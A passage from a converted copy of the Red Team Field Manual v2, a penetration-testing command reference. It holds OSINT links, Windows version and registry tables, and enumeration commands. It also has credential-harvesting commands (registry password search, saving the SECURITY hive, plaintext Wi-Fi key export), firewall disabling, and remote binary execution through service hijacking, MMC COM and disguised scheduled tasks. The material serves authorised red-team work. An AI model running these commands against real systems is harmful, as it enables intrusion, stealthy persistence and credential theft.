---
title: "RTFM - Red Team Field Manual v2"
source: Redteam Kit
converted: 2026-06-29T14:07:46+03:00
type: redteam-reference
---

         RTFM
Red Team Field Manual

     V        2.0




      B   C

     N    D
www.theRTFM.com
@redteamfieldman
RTFM v2. Copyright © 2022 by Ben Clark and Nick Downer


All rights reserved. No part of this work may be reproduced or transmitted in any form or by any
means, without prior written permission of the copyright owner.


ISBN: 9781075091834

Technical Editor: Mike Mangrum


Product and company names mentioned herein may be the trademarks of their respective owners.
Rather than use a trademark symbol with every occurrence of a trademarked name, the author uses
the names only in an editorial fashion, with no intention of infringement of the trademark. Use of a
term in this book should not be regarded as affecting the validity of any trademark or service mark.

The information in this book is distributed "as is". While every precaution was taken to ensure the
accuracy of the material, the author assumes no responsibility or liability for errors or omissions, or
for damages resulting from the use of the information contained herein
                          T                 C
USING THE RED TEAM FIELD MANUAL (RTFM)
 RTFM H     -T
OPEN SOURCE INTELLIGENCE (OSINT)
 N
  Network Resources
  WHOIS Resources
 OSINT R
  Relationship and Recon Tools
  Google Searches
  People Search
  OSINT Websites
WINDOWS
 W          OS D
   Windows 10 & 11 Versions
   Windows Server Versions
   Windows “NT” Versions
   Windows Administrative Binaries
   Environment Variables
   Windows Key Files & Locations
   Registry Run Keys
   Registry Run Keys Cont
 W          S       E
   Windows Situational Awareness
   Operating System Information
   Process & Service Enumeration
   Windows Account Enumeration
   Network Info & Configuration
   Registry Commands & Important Keys
   Remote System Enumeration
 D     M       W
   File Info & Searching
   Tree Filesystem to Searchable File
   Using Volume Shadow Service (VSS)
 R        E
   sc.exe Remote Execution
   MMC COM Object
   Remote Schtasks Execution
 W          A      D
 D            U     E
   Domain Enumeration with Net.exe
   Domain Enumeration with DSQuery
   Domain Enumeration with DSQuery Cont
   Finding User System in a Windows Domain
 W          [R ]C
   Remote Desktop Protocol (RDP) Configuration
   Misc [Re]Configuration
   Disable WIndows Defender
   Windows Event Viewer Manipulation
 U     L      P
   Scheduled Task User Persistence
   Run Key User Persistence
   Startup Directories
   at.exe Schedule (WinXP)
   Poisoning Existing scripts
 S       L      P
   Schtasks on Boot
   Service Creation
   Windows 10 .DLL Hijack (WPTSEXTENSIONS)
 W          S
   PowerShell Scripting
   Powershell Basics
   Powershell OneLiners
   Powershell OneLiners Cont
   Windows Batch Scripting
   Batch Scripts
   Batch Scripts Cont
 P     E
   Mimikatz Credential Manipulation
   Windows Privilege Escalation Checklist
   File System Redirection
MAC OS
 M   OS D
  Mac OS Versions
  File System Structure
 M OS S           E
  Mac OS Situational Awareness
  User Plist File Enumeration
  User enumeration & Modification
  C
  Create A Group
  Group enumeration & Modification
*NIX
 L      OS D
   File System Structure
   Important File/Directory Descriptions
   /etc/shadow File Format
   /etc/shadow Hash Types
   /etc/passwd File Format
 L      S       E
   Operating System Information
   Manipulate Packages Using RPM (Red Hat)
   Manipulate Packages Using DPKG
   Update System Using Apt Get
   Situational Awareness & Process Manipulation
   User Account Enumeration & Configuration
   Network Configuration
   Network Configuration Cont
   DNS Zone Transfer
 L      F M
   File Manipulation
   File Compression & Chunking
   File Hashing
 L      P
   rc.local
   Linux Service
   Crontab
   Poisoning Existing Scripts
 L      S
 L      P    E
   Misc Commands
   Mount USB Device
   Bash History Manipulation
 L      T
   SSH
   Setup SSH Keys
   SSH Forwarding/Tunneling
   TCPDump & TCPReplay
   TCPDump & TCPReplay Cont:
   Screen
   IPTables
   IPTables Examples
   Service Manipulation
 S        OS
   Solaris File System Structure
   Solaris Commands
NETWORKING
 C         P
   Common Ports
   Health Care Protocol & Ports
   Scada Protocols & Ports
   TTL Fingerprinting
 IP 4
   Classful IPv4 Ranges
   Reserved Private Ranges
   Subnetting
   Calculating Subnet Range
 IP 6
   Broadcast Addresses
   Interface Addresses
   IPV6 Tools
 N
   Cisco Commands
   SNMP Tools
   DNSRecon & NMap Reverse DNS
TECHNOLOGIES
 W
   Frequency Chart
   Helpful RF Websites
   Kismet Command Reference
   Linux Wi-Fi Commands
   Linux Bluetooth
   Linux Wi-Fi Testing
   Wi-Fi DOS Attacks
 W
   User Agent String Keywords
   HTML Beef Hook Technique
   Embedded iframe
   Firefox Type Conversions
   Wget Capture Session Token
   Curl
   Automated Web Screenshots (WitnessMe)
   SQLMap
 D
   MSSQL
   POSTGRES
   MySQL
   Oracle
TOOLS
 N
   Scan Types
   Scan Options
   Output/Input Options
   Firewall Evasion
   Misc Flags
 W
   Wireshark Filter Options
   Comparison Operators
   Logical Operators
   Wireshark Examples
 N
   Netcat Examples
   Download a File
   Upload a File
 M
   Metasploit Options
   Create & Catch Payloads (msfvenom)
   Start MSF DB (Kali)
   Meterpreter Pass a Shell
   Meterpreter Commands
   Nmap Through Meterpreter Socks Proxy
 E
   Ettercap Commands
   Ettercap Filter
    hping3
    arping
P           C
    Hydra
    John The Ripper
     Crack Excel Password Protected Document
PROGRAMMING
 ASCII R
   Regex Expressions
   ASCII Table
 P
   Python Port Scanner
   Python Base64 Wordlist
   Convert Windows Registry HEX Format To Readable ASCII
   Read All Files in Folder & Search For Regex
   SSL Encrypted SimpleHTTPServer
   Loop Through IP List, Download File Over HTTP & Execute
   Python Email Sender (SendMail Must Be Installed)
   Generate Random String of N Length
   Python HTTP Server
   Custom Python HTTP Banner Grabber
 S
   Scapy Setup
   Send IPv6 ICMP Message
   UDP Packet With Specific Payload
   NTP Fuzzer
   Send HTTP Message
 P
   Perl Port Scanner
TIPS & TRICKS
 T      T
   FTP Through Non-Interactive Windows Shell
   DNS Transfer on Linux
   Exfil Command Output on a Linux Machine Over ICMP
   Sending Email From Open Relay (Telnet)
 R        S
   Netcat
   Perl
   Python
   Bash
   Java
   PHP
   Ruby
   Telnet
   XTerm
   WGET Script Download & Execute
 T
   FPipe Tunnel
   Socat Tunnel
   SSL Encapsulated Netcat TunneL (STunnel)
TRADECRAFT CONCERNS
 T              C
     Artifact Creation and Uploading
  Persistence Actions
  Remote Execution
  Infrastructure Setup
  Token Manipulation
  End of Day Operations
INDEX
U       R     T  F
    M       (RTFM)
                     RTFM H                    -T
Commands and syntax are provided in a “table” format, and variables in
commands are denoted as bold, italic, and surrounded by brackets.
For example, to run the given command:
  schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR
  <FILE_PATH> /s <IP_ADDRESS>
An operator must change the variable <FILE_PATH> to equal the full path
of the uploaded file, and change <IP_ADDRESS> to equal the IP address
of the target system.
Correctly modifying the above command for execution may look like:
  schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR
  c:\windows\system32\wups.exe /s 172.16.1.10
Many of the commands listed in this book may have other modifiable
arguments. For example, in the command listed above, operators may also
modify the name of the task by modifying the TN value. These types of
replacements and modifications are not required but could be valuable to
change.
Some commands may have “placeholder” variables added which make
understanding the functionality of the command easier. For example, in the
command and explanation below:
  ssh –R 0.0.0.0:8080:127.0.0.1:443 root@<REMOTE_IP>
  Explanation: “Connect to remote IP address, listen on ALL
  local IP addresses on port 8080, traverse SSH tunnel, and
  forward traffic to the local loopback IP on 443”
The IP addresses and ports were left in the command, to better describe its
action and effect.
Commands were tested on the following updated operating systems:

            Windows 10
Windows Server 2022
Ubuntu 22.04 LTS
Kali Linux 2022.2


                           Visit
                    www.theRTFM.com
               for RTFM series updates, video
                     guides, and more.
O   S       I
        (OSINT)
                       N
                NETWORK RESOURCES
                                           DNSstuff
dnsstuff.com/tools
                                           Toolbox
network-tools.com                       Network-Tools
centralops.net                            CentralOps
                                           Hurricane
lg.he.net
                                           Electric
bgp4.as/looking-glasses                      BGP
shodan.io                                   Shodan
viz.greynoise.io                          GreyNoise
mxtoolbox.com/NetworkTools.aspx           MxToolBox
                                         IANA IP and
iana.org/numbers
                                         ASN Lookup


                     WHOIS RESOURCES
icann.org                               ICANN
iana.com                                 IANA
nro.net                                   NRO
afrinic.net                            AFRINIC
apnic.net                               APNIC
ws.arin.net                              ARIN
lacnic.net                             LACNIC
ripe.net                                 RIPE
internic.net                           InterNIC
               OSINT R
     RELATIONSHIP AND RECON TOOLS
github.com/ElevenPaths/FOCA                  FOCA
github.com/laramies/theHarvester          theHarvester
maltego.com                                 Maltego
                                            Recon-ng
https://github.com/lanmaster53/recon-ng
                                           Framework


                  GOOGLE SEARCHES
site:<URL>                          Search only one
                                     Search within a
numrange:<START_NUMBER>…<ENDNUMBER>
                                      number range
                                      Search within
date:<INTEGER>
                                    past [#] months
                                     Find pages that
link:<URL>                             link to given
                                            URL
                                        Find pages
related:<URL>                        related to given
                                            URL
                                    Find pages with
intitle:<STRING>                      <STRING> in
                                             title
                                    Find pages with
inurl:<STRING>                        <STRING> in
                                            URL
                                     Search for files
filetype:<EXTENSION>
                                        by file type
                                    Find phone book
phonebook:<STRING>                       listings of
                                        <STRING>
More info at: exploit-db.com/google-hacking-database


                     PEOPLE SEARCH
peekyou.com                                               PeekYou
spokeo.com                                                 Spokeo
pipl.com                                                     Pipl
intelius.com                                               Intelius
publicrecords.searchsystems.net                        Search Systems


                     OSINT WEBSITES
vulnerabilityassessment.co.uk/Penetration%20Test.html
securitysift.com/passive-reconnaissance/
pentest-standard.org/index.php/Intelligence_Gathering
onstrat.com/osint/
W
             W                       OS D
  This section details important Windows operating system information
   across many different versions such as: Windows XP, 7, 10, 11, and
 Windows Server. Details in this section include version number and dates
  released, administrative binary information, environmental variables,
                  important registry locations and more.

                 W              10     11 V
                                                     DATE
   ID                 VERSION
                                                   RELEASED
 1511           Windows 10 – Threshold 2             2015-11-12
 1607            Windows 10 – Redstone 1             2016-08-02
 1703            Windows 10 – Redstone 2             2017-04-05
 1709            Windows 10 – Redstone 3             2017-10-17
 1803            Windows 10 – Redstone 4             2018-04-30
 1809            Windows 10 – Redstone 5             2018-11-13
 1903              Windows 10 – 19H1                 2019-05-21
 1909            Windows 10 – Vanadium               2019-11-12
 2004            Windows 10 - Vibranium              2020-05-27
 20H2            Windows 10 - Vibranium              2020-10-20
 21H1            Windows 10 - Vibranium              2021-05-18
 21H2            Windows 10 - Vibranium              2021-11-16
 21H2            Windows 11 - Sun Valley             2021-10-05
Note: Windows 10 versions include Home, Pro, Education, Enterprise,
Pro for Workstations, Pro Education, Windows 10 S, and Windows 10
Enterprise LTSC

                 W              S          V
  ID                  OS                   DATE RELEASED
1607          Windows Server 2016                   2016-10-12
 1709            Windows Server                 2017-10-17
 1803            Windows Server                 2018-04-10
 1809            Windows Server                 2018-11-13
 1809         Windows Server 2019               2018-11-13
 1903            Windows Server                 2019-11-12
 1909            Windows Server                 2019-11-12
 2004            Windows Server                 2020-06-26
 20H2            Windows Server                 2020-10-20
 21H2         Windows Server 2022               2021-08-18
Note: Windows servers include Windows Server Essentials, Windows
Server Standard, Windows and Server Datacenter.
                W             “NT” V
  ID                           VERSION
NT 3.1                     Windows NT 3.1 (All)
NT 3.5                     Windows NT 3.5 (All)
NT 3.51                    Windows NT 3.51 (All)
NT 4.0                     Windows NT 4.0 (All)
NT 5.0                      Windows 2000 (All)
NT 5.1    Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)
NT 5.2                Windows XP (64-bit, Pro 64-bit)
NT 5.2        Windows Server 2003 & R2 (Standard, Enterprise)
NT 5.2                     Windows Home Server
             Windows Vista (Starter, Home, Basic, Home Premium,
NT 6.0
                       Business, Enterprise, Ultimate)
NT 6.0     Windows Server 2008 (Foundation, Standard, Enterprise)
NT 6.1       Windows 7 (Starter, Home, Pro, Enterprise, Ultimate)
NT 6.1    Windows Server 2008 R2 (Foundation, Standard, Enterprise)
NT 6.2     Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM))
NT 6.2                        Windows Phone 8
NT 6.2     Windows Server 2012 (Foundation, Essentials, Standard)
NT 6.3                 Windows 8.1 (Pro, Enterprise)
NT 10                    Windows 10 version 1507

  WINDOWS ADMINISTRATIVE BINARIES
lusrmgr.msc                         Local user and group manager
services.msc                           Services control panel
taskmgr.exe                                 Task manager
secpol.msc                           Local security policy editor
eventvwr.msc                                Event viewer
regedit.exe                                Registry editor
gpedit.msc                              Group policy editor
control.exe                                 Control panel
ncpa.cpl       Network connections manager
devmgmt.msc       Device manager editor
diskmgmt.msc       Disk manager editor
             ENVIRONMENT VARIABLES
                              Points to Windows folder
%SYSTEMROOT%
                             (Commonly: C:\Windows)
                          Points to user roaming directory
%APPDATA%                       Commonly (C:\Users\
                        <USERNAME> \AppData\Roaming)
%COMPUTERNAME%                 The computer hostname
                              Points to default OS drive
%HOMEDRIVE%
                                   (Commonly: C:\)
                                Points to user directory
%HOMEPATH%
                      (Commonly: C:\Users\ <USERNAME> )
                   When a command is run without a full path (for
                   example: ipconfig) the OS searches all file paths
%PATH%
                  contained in the PATH environmental variable for
                                        this file
                  When a command is run without an extension (for
                     example: ipconfig) the OS searches for file
%PATHEXT%
                    matches that INCLUDE extensions from this
                                    PATHEXT list
                              Points to default OS drive
%SYSTEMDRIVE%
                                   (Commonly: C:\)
                             Points to user temp folders
%TMP% && %TEMP%                (Commonly: C:\Users\
                       <USERNAME> \AppData\Local\Temp)
                              Points to user directories
%USERPROFILE%
                      (Commonly: C:\Users\ <USERNAME> )
                            Points to Windows directory
%WINDIR%
                             (Commonly: C:\Windows)
                            Points to Windows directory
%ALLUSERSPROFILE%
                    (Commonly: C:\ProgramData Windows 10+)
      WINDOWS KEY FILES & LOCATIONS
                                                          DNS
%SYSTEMROOT%\System32\drivers\etc\hosts
                                                         entries
                                                       Network
%SYSTEMROOT%\System32\drivers\etc\networks
                                                        settings
                                                        User &
%SYSTEMROOT%\System32\config\SAM                       password
                                                         hashes
                                                        Backup
                                                        copy of
%SYSTEMROOT%\repair\SAM
                                                          SAM
                                                       (WinXP)
                                                        Backup
%SYSTEMROOT%\System32\config\RegBack\SAM                copy of
                                                          SAM
                                                      Application
%WINDIR%\System32\config\AppEvent.Evt                      Log
                                                       (WinXP)
                                                        Security
%WINDIR%\System32\config\SecEvent.Evt                    Log
                                                       (WinXP)
                                                        Security
%WINDIR%\System32\config\SECURITY
                                                           Log
                                                      Application
%WINDIR%\System32\config\APPLICATION
                                                           Log
                                                        Startup
%ALLUSERSPROFILE%\Start Menu\Programs\Startup\         Location
                                                       (WinXP)
%USERPROFILE%\Appdata\Roaming\Microsoft\Windows\Start   Startup
Menu\Programs\Startup                                    Folder
                                                      Commonly
                                                          used
%WINDIR%\Panther\
                                                       unattend
                                                      install files
%WINDIR%\System32\Sysprep                             Commonly
                                                          used
                                                                 unattend
                                                                install files
                                                                 Installed
%WINDIR%\kb*                                                      patches
                                                                 (WinXP)
Note: All file paths marked “(WinXP)” are Windows XP only. All others are
tested and working with Windows 10+.
                       REGISTRY RUN KEYS
          List of registry keys accessed during system boot (in load order):
(WinXP)
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute
HKLM\System\CurrentControlSet\Services

Start value of 0 = Kernel Drivers (Load before Kernel initiation)
Start value of 2 = Auto-Start
Start value of 3 = Manual-Start
(WinXP)
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
(WinXP)
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
(WinXP)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
                    REGISTRY RUN KEYS CONT
 (WinXP)
 HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
 HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
 (WinXP)
 HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
 (WinXP)
 HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\load
 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler
 (XP, NT, W2k only)
Note: Some of these keys are also reflected under HKLM\Software\WOW6432Node on
systems running a 64-bit version of Windows.

Note: Windows Sysinternals Autoruns is an excellent utility to inspect and monitor
auto-starting locations on Windows. Available at https://technet.microsoft.com/en-
us/sysinternals/
   W                     S                E
  This section details important and useful system enumeration commands
that can be used to query important operating system, user, and even remote
                            system information.

         W      S        A
      OPERATING SYSTEM INFORMATION
                                                            Enumerate
ver                                                    Windows version
                                                           information
                                                        Display hotfixes
wmic qfe list
                                                       and service packs
                                                        Display whether
wmic cpu get datawidth /format:list                        32 or 64 bit
                                                              system
                                                         Enumerate OS
                                                       architecture - The
                                                           existence of
dir /a c:\
                                                          Program Files
                                                           (x86) means
                                                        machine is 64bit
                                                           Display OS
                                                          configuration,
systeminfo
                                                       including service
                                                            pack levels
fsutil fsinfo drives                                     Display drives
                                                         Display logical
wmic logicaldisk get description,name
                                                              drives
                                                             Display
set                                                        environment
                                                             variables
dir /a c:\pagefile.sys                                 Date of last reboot
                                                        - Created date of
                                                  pagefile.sys is last
                                                        startup
net share                                           Display shares
                                                    Display local
net session
                                                       sessions
                                                  List user mounted
                                                   shares – MUST
reg query HKCU\Software\Micros
                                                  BE RUN IN THE
oft\Windows\CurrentVersion\Explorer\MountPoints2\
                                                   CONTEXT OF
                                                     THE USER
     PROCESS & SERVICE ENUMERATION
                                         Display services hosted in
tasklist /svc
                                                each process
                                               Display detailed
tasklist /FI "USERNAME ne NT
                                          information for running
AUTHORITY\SYSTEM" /FI "STATUS eq
                                            processes that are not
running" /V
                                            running as SYSTEM
                                           Force all instances of a
                                              process and child
taskkill /F /IM <PROCESS_NAME> /T          processes to terminate
                                          (terminate specific PID
                                              with /PID <PID>)
wmic process where name="                Terminate all instances of
<PROCESS_NAME>" call terminate                     a process
                                           Display the executable
wmic process get
                                             path and PID of all
name,executablepath,processid
                                              running processes
                                             Display Anti-Virus
Get-WmiObject -Namespace                     products commonly
"root\SecurityCenter2" -Class                    registered as
AntiVirusProduct -ErrorAction Stop            AntiVirusProduct
                                          (PowerShell command)
                                           Run a file as a specific
runas /user:<DOMAIN>\<USERNAME> "
                                              user (prompts for
<FILE_PATH> [ARGS]"
                                                  password)
tasklist /v | findstr "                    Display processes that
<STRING_TO_SEARCH>"                         match a certain string
                                              Display processes
                                         (including command line
wmic process get processid,commandline
                                         arguments used to launch
                                                     them)
                                          Display services (space
sc query state= all
                                                 after state=)


     WINDOWS ACCOUNT ENUMERATION
echo %USERNAME%                         Display current user
wmic netlogin where (name like "%
                                    List number of times user has
<USERNAME>%") get
                                             logged on
Name,numberoflogons"
net localgroup "Administrator"      Display local Administrators
       NETWORK INFO & CONFIGURATION
                                               Network interface
ipconfig /all
                                                  information
ipconfig /displaydns                       Display local DNS cache
                                          Display all connections and
netstat -ano                             ports with associated process
                                                       ID
                                          Write netstat output to file
netstat –anop tcp 3 >> <FILE_PATH>
                                                every 3 seconds
netstat –an | findstr LISTENING           Display only listening ports
route print                                  Display routing table
arp -a                                        Display ARP table
nslookup

server <FQDN>

set type=ANY                             Attempt DNS zone transfer

ls -d <DOMAIN> > <FILEPATH>

exit
                                         Domain SRV lookup (other
nslookup –type=SRV _www._tcp.<URL>        options: _ldap, _kerberos,
                                                      _sip)
netsh firewall set opmode disable          Disable firewall (*Old)
                                            Display saved wireless
netsh wlan show profiles
                                                    profiles
                                          Export wireless profiles to
netsh wlan export profile folder=.
                                         include plaintext encryption
key=clear
                                                      keys
netsh interface ip show interfaces         List interface IDs/MTUs
netsh interface ip set address name= "               Set IP
<INTERFACE_NAME>" static
<NEW_IP> <NEW_SUBNET_MASK>
<NEW_GATEWAY>
netsh interface ip set dnsservers name= "
<INTERFACE_NAME>" static                         Set DNS server
<DNS_SERVER_IP>
netsh interface ip set address name= "
                                            Set interface to use DHCP
<INTERFACE_NAME>" source=dhcp
       REGISTRY COMMANDS & IMPORTANT KEYS
                                                                         Search
reg query HKLM /f password /t REG_SZ /s                                registry for
                                                                        password
                                                                        (Requires
                                                                        SYSTEM
                                                                       privileges)
reg save HKLM\Security security.hive
                                                                          Save
                                                                        security
                                                                       hive to file
HKLM\Software\Microsoft\Windows NT\CurrentVersion

/v ProductName                                                             OS
/v InstallDate                                                         information
/v RegisteredOwner
/v SystemRoot
                                                                       Time zone
HKLM\System\CurrentControlSet\Control\TimeZoneInformation /v            (offset in
ActiveTimeBias                                                           minutes
                                                                       from UTC)
                                                                         Mapped
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network
                                                                         network
Drive MRU
                                                                           drives
                                                                        Mounted
HKLM\System\MountedDevices
                                                                          devices
                                                                           USB
HKLM\System\CurrentControlSet\Enum\USB
                                                                          devices
                                                                      Audit policy
                                                                      enumeration
HKLM\Security\Policy\PolAdTev                                           (Requires
                                                                        SYSTEM
                                                                       privileges)
                                                                      Kernel/user
HKLM\SYSTEM\CurrentControlSet\Services
                                                                         services
                                                                         Installed
HKLM\Software                                                         software for
                                                                         all users
                                                                         Installed
HKCU\Software                                                         software for
                                                                      current user
                                                                          Recent
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Wordpad\Recent
                                                                        WordPad
File List
                                                                       documents
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU          Recent
                                                                        typed
                                                                      entries in
                                                                       the Run
                                                                     dialog box
                                                                        Typed
HKCU\Software\Microsoft\Internet Explorer\TypedURLs
                                                                        URLs
                                                                    Last registry
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit /v        key
LastKey                                                             accessed via
                                                                     regedit.exe
                                                                    Saved User
                                                                         SSH
HKCU\Software\SimonTatham\Putty\Sessions
                                                                    Connection
                                                                    Information
                  REMOTE SYSTEM ENUMERATION
                                                                     Display
                                                                  sessions for
net session \\<IP_ADDRESS>
                                                                      remote
                                                                      system
                                                                     Display
                                                                    logged in
wmic /node: <IP_ADDRESS> computersystem get username                  user on
                                                                      remote
                                                                     machine
                                                                 Execute file
                                                                  hosted over
wmic /node: <IP_ADDRESS> /user:<DOMAIN>\<USERNAME> /password:        SMB on
<PASSWORD> process call create "\\<IP_ADDRESS>\<SHARE_FOLDER>\        remote
<FILE_PATH>"                                                     system with
                                                                    specified
                                                                  credentials
                                                                     Display
                                                                     process
                                                                 listing every
wmic /node: <IP_ADDRESS> process list brief /every:1
                                                                   second for
                                                                      remote
                                                                     machine
                                                                      Query
reg query \\<IP_ADDRESS>\<REG_HIVE>\<REG_KEY> /v <REG_VALUE>          remote
                                                                     registry
                                                                     Display
                                                                     process
tasklist /S <IP_ADDRESS> /v                                         listing on
                                                                      remote
                                                                      system
                                                                     Display
                                                                      system
systeminfo /S <IP_ADDRESS> /U <DOMAIN>\<USERNAME> /P
                                                                 information
<PASSWORD>
                                                                   for remote
                                                                      system
                                                                     Display
                                                                    shares of
net view \\<IP_ADDRESS> /all
                                                                      remote
                                                                    computer
                                                                  Connect to
                                                                      remote
net use * \\<IP_ADDRESS>\<SHARE_FOLDER> /user:<DOMAIN>\            filesystem
<USERNAME> <PASSWORD>                                                  with
                                                                    specified
                                                                 user account
REG ADD "\\                                                      Add registry
<IP_ADDRESS>\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"       key to
/V "My App" /t REG_SZ /F /D "<FILE_PATH>"                              remote
                                                                       system
                                                                        Copy
xcopy /s \\<IP_ADDRESS>\<SHARE_FOLDER> <LOCAL_DIR>                     remote
                                                                        folder
dir \\<IP_ADDRESS>\c$                                                 Display
                                                                       system
                                                                     uptime -
                                                                      look for
                                                                      creation
                                                                       date of
                                                                   pagefile.sys.
                                                                    This is the
                                                                   last time the
                                                                       system
                                                                       started
tasklist /v /s <IP_ADDRESS>                                           Display
                                                                     processes
                                                                     (look for
                                                                    AV, logged
                                                                     on users,
                                                                   programs of
                                                                      interest,
                                                                         etc.)
                                                                      Display
                                                                       system
                                                                   architecture
                                                                    - Presence
dir \\<IP_ADDRESS>\c$
                                                                   of "Program
                                                                   Files (x86)"
                                                                    means 64-
                                                                    bit system
                    D           M                W
This section details useful techniques pertaining to data mining files and documents from
Windows computers. This section covers finding files of interest, compression, various tree
                                   techniques, and more.

                        FILE INFO & SEARCHING
                                                                             Search for all
dir /a /s /b C:\*pdf*
                                                                                   PDFs
                                                                                   Search
                                                                               current and
                                                                             subdirectories
                                                                               for .txt files
findstr /SI password *.txt
                                                                                  for case
                                                                                insensitive
                                                                                   string
                                                                               "password"
                                                                               Display file
type <FILE_PATH>
                                                                                 contents
                                                                               Display all
                                                                              lines in a file
                                                                                that match
find /I "<STRING_TO_SEARCH>" <FILE_PATH>
                                                                                    case
                                                                                insensitive
                                                                               <STRING>
                                                                               Display line
type <FILE_PATH> | find /c /v ""                                                count for a
                                                                                    file
dir C:\Users\
<USERNAME>\AppData\Roaming\Microsoft\Windows\Recent
                                                                               Enumerate
#Then run the following command on the .lnk:                                    recently
type <FILE_PATH>                                                              opened files

#Look for full file path in output)
TREE FILESYSTEM TO SEARCHABLE FILE
Three separate options to “tree” a filesystem to file on a host, compress it,
                 download it, and then extract it for analysis.
                                                          Enumerate entire
tree.com /F /A \\<IP_ADDRESS>\
                                                        folder structure (and
<FILE_PATH> >
                                                        child folders) to file
c:\windows\temp\silverlight1.log
                                                           using tree.com
                                                          Enumerate entire
dir /s /a \\<IP_ADDRESS>\<FILE_PATH> >
                                                       folder structure to file
c:\windows\temp\silverlight1.log
                                                            using “dir /s”
                                                          Enumerate entire
                                                       folder structure to file
forfiles /S /C "cmd /c echo @path" /p
                                                            using forfiles
<FILE_PATH> >
c:\windows\temp\silverlight1.log
                                                        (Does not work with
                                                             UNC paths)
makecab c:\windows\temp\silverlight1.log                 Compress file and
c:\windows\temp\silverlight_compressed.zip             download from target
expand c:\users\administrator\desktop\
silverlight_compressed.zip                                 Extract results
c:\users\administrator\desktop\extractedFile.txt
   USING VOLUME SHADOW SERVICE (VSS)
                                                             Enumerate saved
vssadmin list shadows                                         volume shadow
                                                                     files
          * If any copies already exist then skip creation command
                                                               Create Shadow
                                                                  file of c:\
wmic shadowcopy call create Volume=c:\                         (Replace with
                                                                desired drive
                                                                    letter)
                                                                 Enumerated
                                                               saved volume
                                                                shadow files
                                                                 (should see
vssadmin list shadows                                          newly created
                                                               shadow). Note
                                                                    the \\?
                                                             \GLOBALROOT
                                                                   location
                                                                Create an OS
                                                               link to created
                                                                 shadow file
                                                             (Note the trailing
                                                              backslash at the
mklink /D C:\restore \\?
                                                              end of the path).
\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\
                                                              The target link
                                                             name (restore in
                                                              this case) must
                                                                  not exist
                      Copy, exfil, interact with shadow
                                                               Remove link

rmdir c:\restore                                             *Windows “del”
                                                               will remove
                                                              actual files! *
                               R                  E
  This section details important and useful commands that can be used to execute payloads on remote
  systems. Proper administrative credentials must be held to run many of the commands listed below.

                          SC.EXE REMOTE EXECUTION
 Upload binary to remote machine, modify existing service to point at that binary, start the service, and
   re-configure the service binpath back to its original value. VSS is a service that works great for this
  technique, but other services can work if they meet the requirements listed in the right column below.
                                                             Ensure service runs as LocalSystem and log
sc \\<IP_ADDRESS> qc vss
                                                                          original binary path
sc \\<IP_ADDRESS> query vss                                         Ensure service is currently off
sc \\<IP_ADDRESS> config vss binpath= "                        Set remote machine binpath to uploaded
<FILE_PATH>"                                                                     binary
                                                             Ensure remote machine service binpath was
sc \\<IP_ADDRESS> qc vss
                                                                              set correctly
sc \\<IP_ADDRESS> start vss                                        Start service on remote machine
                                                              Ensure service is off before setting binpath
sc \\<IP_ADDRESS> stop vss
                                                                            back to original
sc \\<IP_ADDRESS> config vss binpath= "                      Set remote machine service binpath back to
<FILE_PATH>"                                                                    original
                                                             Ensure remote machine service binpath was
sc \\<IP_ADDRESS> qc vss
                                                                           set back correctly


                                    MMC COM OBJECT
 Upload binary to remote machine system folder and execute via MMC COM execution. Set the proper
remote IP and uploaded binary path in the command below and execute via powershell.exe. FILEPATH
                              = full path to target executable to start.

                            Note: Only works against Windows Server Targets
powershell -ep bypass -nop -Command
([activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,”<IP_ADDRESS>”))).
Document.ActiveView.ExecuteShellCommand(“<FILE_PATH>”,$null,$null,”7”)
        REMOTE SCHTASKS EXECUTION
 Upload binary to remote machine, create scheduled task pointing at that
  binary, run task, and delete task. Can change “OfficeUpdater” to any
                  task name that blends into target system.
schtasks /Create /F /RU system /SC ONLOGON /TN
                                                             Add task
OfficeUpdater /TR <FILE_PATH> /s <IP_ADDRESS>
schtasks /query /tn OfficeUpdater /fo list /v /s            Query task
<IP_ADDRESS>                                                 verbose
schtasks /run /tn OfficeUpdater /s <IP_ADDRESS>              Run task
schtasks /delete /tn OfficeUpdater /f /s <IP_ADDRESS>       Delete task
        W                      A               D
 Microsoft Windows Active Directory is a service that combines large
 groups of computing resources into one centralized hierarchical system.
 This system is comprised of user accounts, computers, objects, active
 directory forests, and more. Centralized authentication makes
 administration and expansion of computing resources much easier.
 Active Directory Forest (AD Forest)
 An Active Directory forest is a collection of parent/child domains and is
 used to share authentication between domains, while keeping those domain
 objects (computers, users, etc.) isolated.
 If an organization called Corp has a Chicago and San Diego office, they
 may choose to create a forest made up of a parent domain, and two child
 domains.




 Common Active Directory Object Types
 Computer:           Represents a workstation or server in a domain.
        Represent users or individuals in a domain.
